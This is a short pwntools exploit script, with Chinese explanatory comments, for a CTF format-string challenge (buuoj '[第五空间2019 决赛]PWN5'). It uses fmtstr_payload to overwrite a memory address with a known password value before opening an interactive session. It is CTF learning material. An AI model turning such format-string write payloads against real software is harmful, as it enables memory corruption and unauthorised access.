from pwn import *


# 我们可以利用fmtstr_payload修改任意内容，
# fmtstr_payload是pwntools里面的一个工具，可以实现修改任意内存，用来简化对格式化字符串漏洞的构造工作。
#
# fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目标值})
#
# fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)
#       第一个参数表示格式化字符串的偏移；
#       第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:
#       systemAddress}；本题是将0804a048处改为0x2223322
#       第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
#       第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
#       fmtstr_payload函数返回的就是payload

# 其中offset偏移量可以通过%p测出
#   b'AAAA 1:%p 2:%p 3:%p 4:%p 5:%p 6:%p 7:%p 8:%p 9:%p 10:%p', 输出0x41414141位置即是偏移量
def pwn5(file_name=r'/mnt/hgfs/CyberSecurity/PWN/buuoj/[第五空间2019 决赛]PWN5'):
    target = process([file_name])

    bss_addr = p32(0x0804C044)
    password = 0x12345678

    payload = fmtstr_payload(10, {u32(bss_addr): password})
    print(payload)

    target.sendline(payload)

    target.sendlineafter(b'passwd:', str(password))

    target.interactive()


if __name__ == '__main__':
    pwn5()